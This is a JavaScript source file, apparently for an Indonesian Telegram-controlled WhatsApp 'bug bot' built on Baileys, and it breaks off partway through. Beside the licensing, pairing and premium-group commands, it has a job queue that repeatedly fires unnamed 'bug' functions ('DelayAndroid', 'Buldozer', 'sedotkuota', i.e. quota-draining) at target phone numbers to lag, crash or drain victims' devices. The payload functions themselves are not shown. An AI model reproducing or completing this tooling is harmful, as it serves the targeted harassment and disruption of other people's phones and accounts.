const { Telegraf, Markup } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const jid = "@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const path = require('path');
const mongoose = require("mongoose");
const { BOT_TOKEN, ID_TELEGRAM, REQUIRED_CHANNEL } = require("./config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

// ------ ( Link Raw Github ) ------ //
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/GyzkxT/Gyzk11/refs/heads/main/token.json";

// ------ ( Create Safe Sock ) ------ //
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

// ------ ( Pengecekan Token ) ------ //
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    if (Array.isArray(response.data)) {
      return response.data;
    }

    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    }

    const raw = JSON.stringify(response.data || "");
    const extracted = raw.match(/\d{5,}:[A-Za-z0-9_\-]{20,}/g);

    return extracted || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.green("🔍 Memeriksa token anda"));

  let validTokens = await fetchValidTokens();

  if (!Array.isArray(validTokens)) {
    validTokens = [];
  }

  const tokenList = validTokens.map(t => String(t).trim());

  // Normalisasi token BOT lu
  const normalizedBotToken = String(BOT_TOKEN).trim();

  // cek token
  if (!tokenList.includes(normalizedBotToken)) {
    console.log(chalk.red(`
⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿⢿⣿⡶⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿⣞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿⣿⣛⣒⠂⠀⠀⠀⠀
⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀⠉⠛⢻⡿⠁⠀⠀⠀
⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄⠀⢲⣸⠀⠀⠀⠀⠀
⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻⣦⠈⢻⣦⣀⡀⠀⠀
⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿⣽⡄⢀⣿⣿⣿⠇⠀
⠀⢠⣾⡟⢁⣴⡿⠹⠋⡰⣿⣿⣿⣿⡟⠀⢀⣿⣇⣼⣿⡿⡇⠞⣿⣿⣧⣤⡤
⠀⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀⡔⢶⣽⣿⠿⠥⠀
⠀⠈⠀⢸⠟⣠⡾⠏⠀⡿⢹⣿⣿⣿⣿⣿⣿⣿⣶⣿⣶⣾⣿⣮⣍⠉⠙⢲⠄
⠀⠀⠀⠘⠉⠁⠀⠀⢸⠁⠘⣿⡿⠻⣿⡿⣿⣿⣿⣿⣿⣿⡏⢻⣛⠛⠒⠛⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠈⢻⡄⠹⣿⣿⡇⠙⢷⡈⢿⡟⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠀⣿⣿⠃⠀⠀⠀⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠈⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀
⬡═―—―――――――――――――—═⬡⠀⠀⠀
❌ Akses Telah Di Tolak ❌
Alasan : Bot Token Belum terdaftar 
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀
`));
    process.exit(1);
  }

  console.log(chalk.green(`✅ Alhamdulillah, token valid!`));
  startBot();
}



function startBot() {
  console.log(chalk.green(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀
`));
console.log(chalk.yellow(`
⬡═―—――――――――――――—═⬡⠀⠀⠀
⌑ Status Bot : Connected 
⌑ Version : 1.0 - 𝙰𝚔𝚊𝚘𝚣𝚒𝚔 𝙸𝚗𝚟𝚒𝚌𝚝𝚞𝚜
⌑ Developer : @Gyzkx & @VorteyG⠀⠀
⬡═―—――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
}
validateToken();

const bot = new Telegraf(BOT_TOKEN);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const startSesi = async () => {

console.clear();

console.log(chalk.cyan(`
─────────────────────
DEVELOPER : @Gyzkx & @VorteyG
VERSION : 1.0 
SYSTEM : MONGODB 
STATUS : ACTIVE/TERHUBUNG
─────────────────────
`));

const store = makeInMemoryStore({
  logger: require('pino')().child({
    level: 'silent',
    stream: 'store'
  })
})

const { state, saveCreds } =
  await useMultiFileAuthState('./session');

const { version } =
  await fetchLatestBaileysVersion();

const connectionOptions = {
  version,
  keepAliveIntervalMs: 30000,
  printQRInTerminal: !usePairingCode,
  logger: pino({ level: "silent" }),
  auth: state,
  browser: ['Mac OS', 'Safari', '5.15.7'],
  getMessage: async (key) => ({
    conversation: 'Apophis',
  }),
};

sock = makeWASocket(connectionOptions);

global.sock = sock;

sock.ev.on("messages.upsert", async (m) => {

  try {

    if (!m || !m.messages || !m.messages[0]) {
      return;
    }

    const msg = m.messages[0];
    const chatId =
      msg.key.remoteJid || "Tidak Diketahui";

  } catch (error) {
  }

});

sock.ev.on('creds.update', saveCreds);

store.bind(sock.ev);

// ================= CONNECTION UPDATE ================= //

sock.ev.on('connection.update', async (update) => {

  const {
    connection,
    lastDisconnect
  } = update;

  // ================= OPEN ================= //

  if (connection === 'open') {

    if (lastPairingMessage) {

      const connectedMenu = `\`\`\`js
⬡═―—⊱ ⎧ SUCCESS PAIRING ✅ ⎭ ⊰―—═⬡
⌑ Number : ${lastPairingMessage.phoneNumber}
⌑ Pairing Code : ${lastPairingMessage.pairingCode}
⌑ Status : Sudah terhubung √
╘═——————————————═⬡
\`\`\``;

      try {

        // FIXED
        await bot.telegram.editMessageText(
          lastPairingMessage.chatId,
          lastPairingMessage.messageId,
          undefined,
          connectedMenu,
          {
            parse_mode: "Markdown"
          }
        );

      } catch (e) {
        console.log(e);
      }

    }

    console.clear();

    isWhatsAppConnected = true;

    const currentTime =
      moment()
      .tz('Asia/Jakarta')
      .format('HH:mm:ss');

    console.log(
      chalk.green(
        `PAIRING SENDER BERHASIL ✅`
      )
    );

  }

  // ================= CLOSE ================= //

  if (connection === 'close') {

    const shouldReconnect =
      lastDisconnect?.error?.output?.statusCode
      !== DisconnectReason.loggedOut;

    console.log(
      chalk.red(
        'Koneksi WhatsApp terputus:'
      ),
      shouldReconnect
        ? 'Mencoba Menautkan Perangkat'
        : 'Silakan Menautkan Perangkat Lagi'
    );

    if (shouldReconnect) {
      startSesi();
    }

    isWhatsAppConnected = false;

  }

});

};

startSesi();

//------------------(PREMIUM GROUP)--------------------//
// DB file auto dibuat
const PREM_GROUP_DB = path.join(__dirname, "premgb.json");

// --- helpers db ---
function loadPremGroups() {
  try {
    if (!fs.existsSync(PREM_GROUP_DB)) {
      fs.writeFileSync(PREM_GROUP_DB, JSON.stringify({ groups: [] }, null, 2));
    }
    const raw = fs.readFileSync(PREM_GROUP_DB, "utf8");
    const json = JSON.parse(raw);
    if (!json || !Array.isArray(json.groups)) return { groups: [] };
    return json;
  } catch {
    return { groups: [] };
  }
}

function savePremGroups(db) {
  fs.writeFileSync(PREM_GROUP_DB, JSON.stringify(db, null, 2));
}

function isPremGroup(chatId) {
  const db = loadPremGroups();
  return db.groups.includes(Number(chatId));
}

function addPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  if (!db.groups.includes(id)) db.groups.push(id);
  savePremGroups(db);
  return true;
}

function delPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  db.groups = db.groups.filter((g) => g !== id);
  savePremGroups(db);
  return true;
}

// ================= COOLDOWN ================= //

const cooldownPath = "./cooldown.json";

// otomatis buat file kalau belum ada
if (!fs.existsSync(cooldownPath)) {

  fs.writeFileSync(
    cooldownPath,
    JSON.stringify({
      default: 60
    }, null, 2)
  );

}

// user cooldown sementara RAM
const userCooldowns = {};

// ================= PARSE TIME ================= //

function parseTime(time) {

  const match = time.match(/^(\d+)(s|m)$/i);

  if (!match) return null;

  const value = parseInt(match[1]);
  const type = match[2].toLowerCase();

  if (type === "s") return value;

  if (type === "m") return value * 60;

  return null;

}

// ================= MIDDLEWARE ================= //

async function cooldown(ctx, next) {

  if (!ctx.message || !ctx.message.text) {
    return next();
  }

  // bypass owner
  if (ctx.from.id == config.ID_TELEGRAM) {
    return next();
  }

  // baca cooldown
  const data = JSON.parse(
    fs.readFileSync(cooldownPath)
  );

  const cooldownTime = data.default || 60;

  const userId = ctx.from.id;

  // buat slot user
  if (!userCooldowns[userId]) {
    userCooldowns[userId] = 0;
  }

  const now = Date.now();

  const remaining =
    cooldownTime -
    Math.floor((now - userCooldowns[userId]) / 1000);

  if (remaining > 0) {

    return ctx.reply(
`
⏳ Tunggu ${remaining} detik sebelum memakai command lagi.
`
    );

  }

  // simpan waktu terakhir
  userCooldowns[userId] = now;

  return next();

}


// --- middleware owner only ---
const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

// --- middleware: premium group gate (pakai buat command premium) ---
const premGroupOnly = () => async (ctx, next) => {
  const chatType = ctx.chat?.type;
  if (chatType === "private") {
    return ctx.reply("❌ Command ini hanya bisa dipakai di grup premium.");
  }
  if (!isPremGroup(ctx.chat.id)) {
    const title = ctx.chat?.title || "Group ini";
    return ctx.reply(`❌ ☇ Grup <b>${escapeHtml(title)}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, {
      parse_mode: "HTML",
    });
  }
  return next();
};

// --- html escape biar aman ---
function escapeHtml(s = "") {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// -------- ( Command Kill Sender ) -------- //
bot.command("killsession", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});


// ================= SET COOLDOWN ================= //

bot.command("setcd", async (ctx) => {

  // owner only
  if (ctx.from.id != config.ID_TELEGRAM) {
    return ctx.reply("❌ Khusus owner");
  }

  const args = ctx.message.text.split(" ");

  const input = args[1];

  if (!input) {

    return ctx.reply(
`
*Format:*
/setcd 30s
/setcd 5m
^•^
s = detik
m = menit
`
    );

  }

  const seconds = parseTime(input);

  if (!seconds) {

    return ctx.reply(
`❌ *Format salah* ❌
Contoh:
10s = 10 detik
5m = 5 menit
`
    );

  }

  // simpan permanen
  fs.writeFileSync(
    cooldownPath,
    JSON.stringify({
      default: seconds
    }, null, 2)
  );

  ctx.reply(
`✅ Cooldown berhasil di set ke ${input}`
  );

});

// -------- ( Command Add Sender ) -------- //

bot.command("connect", async (ctx) => {

  if (ctx.from.id != ID_TELEGRAM) {

    return ctx.reply(
      "❌ ☇ Akses hanya untuk pemilik"
    );

  }

  const args =
    ctx.message.text.split(" ")[1];

  if (!args) {

    return ctx.reply(
      "🪧 ☇ Format: /connect 62×××"
    );

  }

  const phoneNumber =
    args.replace(/[^0-9]/g, "");

  if (!phoneNumber) {

    return ctx.reply(
      "❌ ☇ Nomor tidak valid"
    );

  }

  try {

    if (!sock) {

      return ctx.reply(
        "❌ ☇ Socket belum siap, coba lagi nanti"
      );

    }

    if (sock.authState.creds.registered) {

      return ctx.reply(
        `✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`
      );

    }

    const code =
      await sock.requestPairingCode(
        phoneNumber,
        "1234VVIP"
      );

    const formattedCode =
      code?.match(/.{1,4}/g)?.join("-")
      || code;

    const pairingMenu = `\`\`\`js
⬡═―—⊱ ⎧ ADD PAIRING ⎭ ⊰―—═⬡
⌑ Number : ${phoneNumber}
⌑ Pairing Code : ${formattedCode}
⌑ Type: Waiting ⏱
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.reply(
      pairingMenu,
      {
        parse_mode: "Markdown"
      }
    );

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode
    };

  } catch (err) {

    console.error(err);

  }

});


// ================================
// COMMAND: ADD PREMIUM GROUP
// /addpremgrup
// ================================
bot.command("addgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  addPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `✅ ☇ <b>${title}</b> berhasil ditambahkan sebagai Group premium`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: DELETE PREMIUM GROUP
// /delpremgrup
// ================================
bot.command("delgroup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  delPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `🗑 ☇ <b>${title}</b> berhasil dihapus dari group premium`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: LIST PREMIUM GROUP
// /listpremgrup
// ================================
bot.command("listgroup", ownerOnly(), async (ctx) => {
  const db = loadPremGroups();
  if (!db.groups.length) return ctx.reply("📭 Tidak ada grup premium.");

  const lines = db.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n");
  return ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${lines}`, { parse_mode: "HTML" });
});


// ================================
// COMMAND: BLOCK COMMAND
// /block
// ================================
bot.command("block", (ctx) => {

  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply(
      "❌ ☇ Akses hanya untuk pemilik"
    );
  }

  let cmd =
    ctx.message.text.split(" ")[1];

  if (!cmd) {

    return ctx.reply(
      "🪧 Format: /block namacommand"
    );

  }

  cmd = cmd.toLowerCase();
  // hapus /
  cmd = cmd.replace("/", "");
  // cek sudah diblock
  if (blockedCommands[cmd]) {

    return ctx.reply(
      `⚠️ /${cmd} sudah diblok sebelumnya.`
    );

  }

  blockedCommands[cmd] = true;
  saveData();
  ctx.reply(
    `🔒 /${cmd} berhasil diblok (permanen).`
  );

});

// ================================
// COMMAND: UNBLOCK COMMAND
// ================================

bot.command("unblock", (ctx) => {

  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply(
      "❌ ☇ Akses hanya untuk pemilik"
    );
  }

  let cmd =
    ctx.message.text.split(" ")[1];
  if (!cmd) {
    return ctx.reply(
      "🪧 Format: /unblock namacommand"
    );

  }
  cmd = cmd.toLowerCase();
  // hapus /
  cmd = cmd.replace("/", "");
  // cek belum diblock
  if (!blockedCommands[cmd]) {

    return ctx.reply(
      `⚠️ /${cmd} tidak sedang diblok.`
    );

  }

  delete blockedCommands[cmd];
  saveData();

  ctx.reply(
    `🔓 /${cmd} berhasil dibuka.`
  );

});

// ================================
// COMMAND: LIST BLOCK COMMAND
// /listblock
// ================================
bot.command("listblock", (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

  const list = Object.keys(blockedCommands);

  if (list.length === 0) {
    return ctx.reply("✅ Tidak ada command diblok.");
  }

  ctx.reply(
    "🔒 Command diblok:\n\n" +
    list.map(c => `• /${c}`).join("\n")
  );
});


// ====================================================
// X-FCOLS QUEUE SYSTEM – SIMPEL TANPA LOOP DI COMMAND
// Loop diatur via /setloop, command spam tetap simple
// ====================================================
let globalQueue = [];
let isProcessing = false;
let activeJob = null;
let defaultLoop = 10;   // 🔥 NILAI LOOP DEFAULT, BISA DIUBAH VIA COMMAND

function formatTarget(number) {
  if (!number) return null;
  let clean = number.toString().replace(/[^0-9]/g, '');
  if (clean.startsWith('0')) clean = '62' + clean.slice(1);
  return clean + '@s.whatsapp.net';
}

// ----------- ( FUNGSI PEMANGGILAN QUEQEU ) ----------- //

// ~ Fungsi Delay invisible Bebas Spam
function DelayAndroid(username, rawTarget, bugFunction) {
  const target = formatTarget(rawTarget);
  if (!target) return false;
  if (typeof bugFunction !== 'function') return false;
  
  globalQueue.push({
    username: username,
    rawTarget: rawTarget,
    target: target,
    loops: defaultLoop,   // 🔥 PAKAI LOOP DEFAULT SAAT INI
    SilentWipeStatus: bugFunction
  });
  
  console.log(chalk.cyan(`📥 Masuk: => ${rawTarget} Antrian ${globalQueue.length}`));
  _DelayBebasSpam(); // ~ process bug antrian
  return true;
}

// ~ Fungsi Buldozer invisible Bebas Spam
function BuldozerJir(username, rawTarget, bugFunction) {
  const target = formatTarget(rawTarget);
  if (!target) return false;
  if (typeof bugFunction !== 'function') return false;
  
  globalQueue.push({
    username: username,
    rawTarget: rawTarget,
    target: target,
    loops: defaultLoop,   // 🔥 PAKAI LOOP DEFAULT SAAT INI
    Buldozer: bugFunction
  });
  
  console.log(chalk.cyan(`📥 Masuk: => ${rawTarget} Antrian ${globalQueue.length}`));
  _sedotkuota(); // ~ process bug antrian
  return true;
}

// ----------- ( FUNGSI PROSES QUEQEU ) ----------- //

// ~ Fungsi Buldozer invisible Bebas Spam
async function _sedotkuota() {
  if (isProcessing || globalQueue.length === 0) return;
  isProcessing = true;
  
  while (globalQueue.length > 0) {
    activeJob = globalQueue[0];
    const { username, rawTarget, target, loops, Buldozer } = activeJob;
    
    console.log(chalk.yellow(`⏳ diproses: => SedotKuota ${rawTarget} Posisi ${globalQueue.length}`));
    
    for (let i = 1; i <= loops; i++) {
      try {
        await Buldozer(sock, target);
        console.log(chalk.whiteBright(`✅selesai: -> ${rawTarget}`));
      } catch (err) {
        console.log(chalk.red(`❌ Gagal: ${err.message}`));
      }
      if (i < loops) await new Promise(r => setTimeout(r, 4000));
    }
    
    globalQueue.shift();
    activeJob = null;
    await new Promise(r => setTimeout(r, 2000));
  }
  isProcessing = false;
  console.log(chalk.magenta(`🛑 TIDAK ADA ANTRIAN LAGI`));
}

// ~ Fungsi Delay invisible Bebas Spam
async function _DelayBebasSpam() {
  if (isProcessing || globalQueue.length === 0) return;
  isProcessing = true;
  
  while (globalQueue.length > 0) {
    activeJob = globalQueue[0];
    const { username, rawTarget, target, loops, SilentWipeStatus } = activeJob;
    
    console.log(chalk.yellow(`⏳ diproses: => Delay ${rawTarget} Posisi ${globalQueue.length}`));
    
    for (let i = 1; i <= loops; i++) {
      try {
        await SilentWipeStatus(sock, target);
        console.log(chalk.whiteBright(`✅selesai: -> ${rawTarget}`));
      } catch (err) {
        console.log(chalk.red(`❌ Gagal: ${err.message}`));
      }
      if (i < loops) await new Promise(r => setTimeout(r, 4000));
    }
    
    globalQueue.shift();
    activeJob = null;
    await new Promise(r => setTimeout(r, 2000));
  }
  isProcessing = false;
  console.log(chalk.magenta(`🛑 TIDAK ADA ANTRIAN LAGI`));
}

// ----------- ( CHECKING ANTRIAN SYSTEM ) ----------- //
function getQueueStatus() {
  if (globalQueue.length === 0 && !activeJob) return "✅ SISTEM STANDBY\nTidak ada antrian.";
  let text = "📊 𝙰𝙽𝚃𝚁𝙸𝙰𝙽 𝙱𝚄𝙶 𝙰𝙺𝙰𝙾𝚉𝙸𝙺 𝙸𝙺𝚅𝙸𝙲𝚃𝚄𝚂\n━━━━━━━━━━━━━━━\n";
  if (activeJob) {
    text += `🔍 *SEDANG DIPROSES:*\n• Target: ${activeJob.rawTarget}\n• Pengguna: @${activeJob.username}\n• Loop: ${activeJob.loops}x\n\n`;
  }
  if (globalQueue.length > 0) {
    text += `🔵 *ANTRIAN MENUNGGU:*\n`;
    globalQueue.slice(0, 10).forEach((job, idx) => {
      text += `${idx+1}. ${job.rawTarget} (@${job.username}) – ${job.loops}x\n`;
    });
    if (globalQueue.length > 10) text += `_...dan ${globalQueue.length-10} lainnya._\n`;
  } else text += `ℹ️ Tidak ada antrian.\n`;
  text += `\n━━━━━━━━━━━━━━━\n⚡ Total: ${globalQueue.length} job\n🎯 Loop default saat ini: ${defaultLoop}`;
  return text;
}

function clearAllJobs() {
  const total = globalQueue.length;
  globalQueue = [];
  activeJob = null;
  isProcessing = false;
  console.log(chalk.red(`🗑️ ANTRIAN DIHAPUS (${total} job)`));
  return total;
}


// -------- ( CHECK JOIN CHANNEL ) ------- //
const config = require("./config");

// ================= FORCE JOIN ================= //

// 🔍 cek channel belum di join
async function getNotJoinedChannels(ctx) {

  const notJoined = [];

  for (const channel of config.REQUIRED_CHANNELS) {

    try {

      const member = await ctx.telegram.getChatMember(
        channel,
        ctx.from.id
      );

      const joined = [
        "creator",
        "administrator",
        "member"
      ].includes(member.status);

      if (!joined) {
        notJoined.push(channel);
      }

    } catch (e) {

      notJoined.push(channel);

    }

  }

  return notJoined;
}

// 🎯 middleware force join
bot.use(async (ctx, next) => {

  if (!ctx.from) return;

  // bypass owner
  if (ctx.from.id === config.ID_TELEGRAM) {
    return next();
  }

  const notJoined = await getNotJoinedChannels(ctx);

  if (notJoined.length > 0) {

    const buttons = [];

    // tombol channel
    for (const ch of notJoined) {

      const style = styles[styleIndex];

      styleIndex++;
      if (styleIndex >= styles.length) {
        styleIndex = 0;
      }

      buttons.push([
        {
          text: `📢 ${ch.replace("@", "")}`,
          url: `https://t.me/${ch.replace("@", "")}`,
          style
        }
      ]);

    }

    // tombol cek join
    buttons.push([
      {
        text: "✅ Sudah Join",
